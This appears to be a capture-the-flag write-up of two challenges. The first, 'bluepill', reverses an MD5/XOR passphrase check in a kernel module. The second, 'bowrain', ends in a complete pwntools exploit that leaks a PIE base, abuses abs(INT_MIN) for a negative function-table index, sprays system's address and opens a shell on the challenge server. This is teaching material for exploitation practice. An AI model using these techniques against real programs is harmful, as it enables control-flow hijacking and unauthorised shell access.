## bluepill

A kernel object is given, which I am not very familiar with, however, `pill_choice` is the critical function, obviously.

The basic logic is to get input from function `strncpy_from_user`, and test the input.

```c
  v5 = file_open("/proc/version");
  if ( v5 )
  {
    v6 = v5;
    file_read(v5, (unsigned __int8 *)magic, 0x1F4u);
    v7 = v6;
    v8 = &choice_35697;
    filp_close(v7, 0LL);
    if ( strlen((const char *)&choice_35697) > 0xB )
    {
      v9 = checks_35680;
      while ( 1 )
      {
        v10 = 0LL;
        memset(&v21, 0, 0x19uLL);
        *(_QWORD *)digest = 0LL;
        v19 = 0LL;
        s2 = 0LL;
        calc(v8, 4uLL, digest); //calculate md5 for 4 bytes
        do
        {
          v11 = magic[v10];
          v12 = digest[v10];
          v13 = 2 * v10++;
          sprintf((char *)&s2 + v13, "%02x", v11 ^ v12);
        }
        while ( v10 != 16 );
        if ( memcmp(v9, &s2, 0x20uLL) )
          break;
        v8 += 4;
        v9 += 33;
        if ( v8 == &choice_35697 + 12 )
        {
          printk(&success);
            //...
```

The length of string must be larger than 11, and then only 12 bytes are useful, which are grouped as 4 bytes and their md5 are calculated. To know `calc` is calculating md5, simply inspect the constants and global array data used and search them on google. However, in some other reverse challenges the hash algorithm may be modified, so this approach can't be 100% sure.

Then the md5 hashes will be `xor` with the content from `/proc/version`, then compare with the 

```assembly
.data:0000000000000800 checks_35680    db '40369e8c78b46122a4e813228ae8ee6e',0
.data:0000000000000821 aE4a75afe114e44 db 'e4a75afe114e4483a46aaa20fe4e6ead',0
.data:0000000000000842 a8c3749214f4a91 db '8c3749214f4a9131ebc67e6c7a86d162',0
```

so to get md5 hashes, simply `xor` the hex above with content in `/proc/version`, as shown.

```python
import hashlib
from pwn import *
proc_version = "Linux version 4.17.0-rc4+ (likvidera@ubuntu) (gcc version 7.2.0 (Ubuntu 7.2.0-8ubuntu3.2)) #9 Sat May 12 12:57:01 PDT 2018"
# obtained from cat /proc/version within the kernel given
keys = ["40369e8c78b46122a4e813228ae8ee6e", "e4a75afe114e4483a46aaa20fe4e6ead", "8c3749214f4a9131ebc67e6c7a86d162"]

def get_hashes():
	ret = []
	for i in xrange(0,3):
		one_hashes = ""
		hex_data = keys[i].decode("hex")
		for i in xrange(0,len(hex_data)):
			one_hashes += chr(ord(proc_version[i]) ^ ord(hex_data[i]))
		ret.append(one_hashes)
	return ret

def md5(string):
	m = hashlib.md5()
	m.update(string)
	return m.digest()

hashes = get_hashes()
for i in xrange(0, 3):
	print "".join("{:02x}".format(ord(c)) for c in hashes[i])

#0c5ff0f900941747d69b7a4de4c8da40
#a8ce348b696e32e6d619c34f906e5a83
#c05e2754376ae75499b5170314a6e54c
#crack the md5 using this website https://cmd5.org/
#g1Mm3Th3r3D1
```

However, this is not the flag, obtain the flag by accessing the kernel object.

```bash
$ echo "g1Mm3Th3r3D1" > /proc/bluepill
$ cat flag
```

## bowrain

### problems

1. no null termination in function `sub_CB0`, which is used to get a string, so PIE base address can be leaked.
2. `abs(INT_MIN)` is still a negative number
3. `x % n` is negative when x is negative

in function `main`

```c
 while ( 1 )
  {
    v4[0] = get_number();
    if ( v4[0] == -1 )
    {
      printf("\x1B[31;1merror:\x1B[0m not a number: %s\n", ::a1, *(_QWORD *)v4, v5);
        // leak PIE possible
    }
    else
    {
      v4[1] = abs(v4[0]) % 7;//can be negative if v4[0] is 2147483648
      memset(::a1, 0, endptr - (char *)::a1);
      v3 = (void (__fastcall *)(char *, _QWORD))*(&off_2030A0 + v4[1]);
      //will access a function pointer that can be manipulated by input if negative
      v3(++endptr, 0LL);
      //++endptr will point to the address just after the null terminator if input
    }
    print_choice();
```

and in `.data`

```assembly
.data:0000000000203020 a1              db 30h, 7Fh dup(0)
.data:00000000002030A0 off_2030A0      dq offset sub_AE0
.data:00000000002030A8                 dq offset sub_B1A
.data:00000000002030B0                 dq offset sub_B54
.data:00000000002030B8                 dq offset sub_B8E
.data:00000000002030C0                 dq offset sub_BC8
.data:00000000002030C8                 dq offset sub_C02
.data:00000000002030D0                 dq offset sub_C3C
```

buffer that holds the input is contiguous with the function pointers.

First of all, since there is no null termination, we can leak address of `sub_AE0` to get base address.

Secondly, if the index to access the function pointer table is negative, we can hijack the control flow to function `system`.

```python
from pwn import *

g_local=False
#context.log_level='debug'
if g_local:
	sh =process('./bowrain')#env={'LD_PRELOAD':'./libc.so.6'}
	gdb.attach(sh)
else:
	sh = remote("159.65.80.92", 54321)

sh.send("A" * 0x80 + "\n")
sh.recvuntil("A" * 0x80)
leak = sh.recvuntil(": ")[:6] + "\x00\x00"
base = u64(leak) - 0xAE0
print hex(base)

payload = "2147483648" + "\x00" + "/bin/sh\x00"
payload += "A" * 5
assert len(payload) == 0x18
payload += ((0x80 - len(payload)) / 8) * p64(base + 0x958)
# spray the address of system, 
# so any access of function pointer table with negative index > -7 (by % operation)
# will give address of system
# excact number can be determined by debugging, but spraying is more convinient
sh.send(payload + "\n")
sh.interactive()
```

